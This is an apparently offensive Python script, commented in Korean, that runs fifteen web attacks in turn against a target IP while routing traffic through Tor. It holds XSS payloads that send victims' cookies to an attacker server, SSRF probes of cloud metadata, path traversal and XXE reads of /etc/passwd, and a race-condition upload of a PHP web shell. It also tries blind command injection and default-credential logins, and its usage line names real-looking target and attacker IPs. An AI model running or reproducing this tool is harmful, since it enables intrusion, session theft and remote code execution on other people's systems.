#!/usr/bin/env python3
"""
궁극의 공격 스크립트
모든 가능한 방법을 자동으로 시도
"""

import requests
import time
import random
import base64
import sys

class UltimateAttack:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.base_url = f"http://{target_ip}"

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.working_method = None

    def print_header(self, text):
        print(f"\n{'='*60}")
        print(f"  {text}")
        print('='*60)

    # ============ 방법 1: XSS to Cookie Stealing ============
    def try_xss_cookie_steal(self):
        self.print_header("방법 1: XSS를 통한 쿠키 탈취")

        xss_payloads = [
            f"<script>fetch('http://{self.attacker_ip}:8000/?c='+document.cookie)</script>",
            f"<img src=x onerror=\"fetch('http://{self.attacker_ip}:8000/?c='+document.cookie)\">",
            f"<svg onload=\"fetch('http://{self.attacker_ip}:8000/?c='+document.cookie)\">",
        ]

        print("[*] XSS 페이로드 주입 시도...")
        print(f"[!] 공격자 서버에서 리스너 시작:")
        print(f"    python3 -m http.server 8000")

        # 댓글, 프로필, 게시글 등에 XSS 주입
        # (구현 생략 - 실제로는 각 입력 필드 테스트)

        return False

    # ============ 방법 2: SSRF (Server-Side Request Forgery) ============
    def try_ssrf(self):
        self.print_header("방법 2: SSRF 공격")

        print("[*] SSRF 취약점 검색 중...")

        # file.php가 SSRF 취약점일 수 있음
        ssrf_payloads = [
            # 내부 네트워크 스캔
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://localhost/admin",

            # 클라우드 메타데이터
            "http://169.254.169.254/latest/meta-data/",

            # 파일 읽기
            "file:///etc/passwd",
            "file:///var/www/html/config.php",
        ]

        for payload in ssrf_payloads:
            try:
                url = f"{self.base_url}/file.php?name={payload}"
                resp = self.session.get(url, timeout=5)

                if resp.status_code == 200 and len(resp.text) > 0:
                    print(f"[+] SSRF 작동: {payload}")
                    print(f"    응답: {resp.text[:100]}")
                    return True
            except:
                pass

        print("[-] SSRF 실패")
        return False

    # ============ 방법 3: Path Traversal ============
    def try_path_traversal(self):
        self.print_header("방법 3: Path Traversal")

        print("[*] 민감한 파일 읽기 시도...")

        files = [
            "../../../etc/passwd",
            "../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "../../../var/www/html/config.php",
            "../../config.php",
        ]

        for file_path in files:
            try:
                url = f"{self.base_url}/file.php?name={file_path}"
                resp = self.session.get(url, timeout=5)

                if 'root:' in resp.text or 'mysql' in resp.text.lower():
                    print(f"[+] ✅ 파일 읽기 성공: {file_path}")
                    print(f"    내용: {resp.text[:200]}")
                    return True, file_path
            except:
                pass

        print("[-] Path Traversal 실패")
        return False, None

    # ============ 방법 4: XXE (XML External Entity) ============
    def try_xxe(self):
        self.print_header("방법 4: XXE 공격")

        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""

        print("[*] XXE 페이로드 전송...")

        try:
            resp = self.session.post(
                f"{self.base_url}/upload.php",
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )

            if 'root:' in resp.text:
                print(f"[+] XXE 성공!")
                return True
        except:
            pass

        print("[-] XXE 실패")
        return False

    # ============ 방법 5: Session Hijacking ============
    def try_session_hijacking(self):
        self.print_header("방법 5: Session Hijacking")

        print("[*] 세션 예측/고정 시도...")

        # 약한 세션 ID 생성 패턴 찾기
        session_ids = []

        for i in range(3):
            resp = self.session.get(f"{self.base_url}/login.php")
            if 'PHPSESSID' in self.session.cookies:
                sid = self.session.cookies['PHPSESSID']
                session_ids.append(sid)
                print(f"    세션 ID {i+1}: {sid}")

        # 패턴 분석 (숫자만? 시간 기반?)
        # (구현 생략)

        print("[-] Session Hijacking 실패")
        return False

    # ============ 방법 6: CSRF (Cross-Site Request Forgery) ============
    def try_csrf(self):
        self.print_header("방법 6: CSRF 공격")

        print("[*] CSRF 토큰 없는 액션 찾기...")

        # 파일 업로드, 비밀번호 변경 등에 CSRF 토큰이 없는지 확인
        # (구현 생략)

        print("[-] CSRF 실패")
        return False

    # ============ 방법 7: Race Condition ============
    def try_race_condition(self):
        self.print_header("방법 7: Race Condition")

        print("[*] 동시 요청으로 경쟁 상태 유발...")

        # 파일 업로드 체크 우회
        import threading

        def upload_thread():
            files = {'file': ('shell.php', '<?php system($_GET[x]); ?>', 'image/jpeg')}
            self.session.post(f"{self.base_url}/upload.php", files=files)

        threads = []
        for _ in range(10):
            t = threading.Thread(target=upload_thread)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print("[*] 업로드 시도 완료, 파일 확인 중...")

        try:
            resp = self.session.get(f"{self.base_url}/uploads/shell.php?x=pwd")
            if '/var' in resp.text:
                print(f"[+] ✅ Race Condition 성공!")
                return True
        except:
            pass

        print("[-] Race Condition 실패")
        return False

    # ============ 방법 8: Insecure Deserialization ============
    def try_deserialization(self):
        self.print_header("방법 8: Insecure Deserialization")

        print("[*] PHP 직렬화 공격 시도...")

        # PHP Object Injection
        php_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'

        try:
            resp = self.session.post(
                f"{self.base_url}/index.php",
                cookies={'data': php_payload},
                timeout=10
            )
        except:
            pass

        print("[-] Deserialization 실패")
        return False

    # ============ 방법 9: Template Injection ============
    def try_template_injection(self):
        self.print_header("방법 9: Template Injection")

        print("[*] SSTI 페이로드 시도...")

        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
            "{{self}}",
        ]

        # 검색, 댓글 등에서 템플릿 주입 시도
        # (구현 생략)

        print("[-] Template Injection 실패")
        return False

    # ============ 방법 10: Command Injection (Blind) ============
    def try_blind_command_injection(self):
        self.print_header("방법 10: Blind Command Injection")

        print("[*] 시간 기반 Blind Command Injection...")

        # sleep 명령으로 시간 지연 확인
        payloads = [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
        ]

        for payload in payloads:
            try:
                start = time.time()

                url = f"{self.base_url}/file.php?name=test{payload}"
                resp = self.session.get(url, timeout=10)

                elapsed = time.time() - start

                if elapsed >= 4.5:
                    print(f"[+] ✅ Blind Command Injection 성공: {payload}")
                    print(f"    시간: {elapsed:.2f}초")
                    return True, payload
            except:
                pass

        print("[-] Blind Command Injection 실패")
        return False, None

    # ============ 방법 11: HTTP Request Smuggling ============
    def try_request_smuggling(self):
        self.print_header("방법 11: HTTP Request Smuggling")

        print("[*] CL.TE / TE.CL 불일치 시도...")

        # (고급 기법, 구현 복잡)

        print("[-] Request Smuggling 실패")
        return False

    # ============ 방법 12: WebSocket Hijacking ============
    def try_websocket_hijack(self):
        self.print_header("방법 12: WebSocket Hijacking")

        print("[*] WebSocket 엔드포인트 검색...")

        # (구현 생략)

        print("[-] WebSocket Hijacking 실패")
        return False

    # ============ 방법 13: DNS Rebinding ============
    def try_dns_rebinding(self):
        self.print_header("방법 13: DNS Rebinding")

        print("[*] DNS Rebinding 공격...")

        # (고급 기법, 구현 복잡)

        print("[-] DNS Rebinding 실패")
        return False

    # ============ 방법 14: GraphQL Introspection ============
    def try_graphql(self):
        self.print_header("방법 14: GraphQL Introspection")

        print("[*] GraphQL 엔드포인트 검색...")

        graphql_paths = ['/graphql', '/api/graphql', '/graphiql']

        for path in graphql_paths:
            try:
                resp = self.session.post(
                    f"{self.base_url}{path}",
                    json={'query': '{__schema{types{name}}}'},
                    timeout=5
                )

                if 'data' in resp.text:
                    print(f"[+] GraphQL 발견: {path}")
                    return True
            except:
                pass

        print("[-] GraphQL 실패")
        return False

    # ============ 방법 15: 기존 세션 재사용 ============
    def try_session_reuse(self):
        self.print_header("방법 15: 기존 세션 재사용")

        print("[*] 이전 세션 쿠키 시도...")

        # 기본 계정으로 로그인해서 세션 얻기
        creds = [
            ("alice", "alice2024"),
            ("admin", "admin123"),
            ("bob", "bobby123"),
        ]

        for username, password in creds:
            try:
                data = {'username': username, 'password': password}
                resp = self.session.post(
                    f"{self.base_url}/login.php",
                    data=data,
                    timeout=10,
                    allow_redirects=True
                )

                if 'login.php' not in resp.url:
                    print(f"[+] ✅ 로그인 성공: {username}")
                    return True, username
            except:
                pass

        print("[-] 기본 계정 로그인 실패")
        return False, None

    def run(self):
        """모든 방법 시도"""
        print("="*60)
        print("궁극의 공격 스크립트")
        print("모든 가능한 방법을 자동으로 시도")
        print("="*60)

        methods = [
            ("세션 재사용 (기본 계정)", self.try_session_reuse),
            ("SSRF", self.try_ssrf),
            ("Path Traversal", self.try_path_traversal),
            ("Blind Command Injection", self.try_blind_command_injection),
            ("Race Condition", self.try_race_condition),
            ("XXE", self.try_xxe),
            ("XSS Cookie Steal", self.try_xss_cookie_steal),
            ("Session Hijacking", self.try_session_hijacking),
            ("CSRF", self.try_csrf),
            ("Deserialization", self.try_deserialization),
            ("Template Injection", self.try_template_injection),
            ("Request Smuggling", self.try_request_smuggling),
            ("WebSocket Hijacking", self.try_websocket_hijack),
            ("DNS Rebinding", self.try_dns_rebinding),
            ("GraphQL", self.try_graphql),
        ]

        for name, method in methods:
            try:
                result = method()

                if result and result != False:
                    print(f"\n[+] ✅✅✅ {name} 성공!")
                    self.working_method = name
                    return True

                time.sleep(2)

            except Exception as e:
                print(f"[-] {name} 오류: {str(e)[:50]}")

        print("\n" + "="*60)
        print("[-] 모든 방법 실패")
        print("="*60)
        return False

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 89_ultimate_attack.py <TARGET_IP> <ATTACKER_IP> <PORT>")
        print("예시: python3 89_ultimate_attack.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    attack = UltimateAttack(target_ip, attacker_ip, attacker_port)
    attack.run()

if __name__ == "__main__":
    main()
